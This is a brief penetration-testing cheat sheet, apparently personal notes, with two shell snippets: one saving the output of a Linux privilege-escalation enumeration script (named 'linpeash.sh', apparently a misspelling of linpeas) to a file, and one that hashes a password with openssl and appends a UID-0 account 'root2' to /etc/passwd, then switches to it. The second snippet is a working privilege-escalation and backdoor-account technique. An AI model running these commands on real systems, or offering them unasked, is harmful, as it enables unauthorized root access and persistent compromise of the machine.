## colored output to file
```bash
script -q -c "linpeash.sh" filename.txt
```

## write root user to /etc/passwd
```shell
openssl passwd password
echo "root2:COPY_FROM_ABOVE:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2
id
```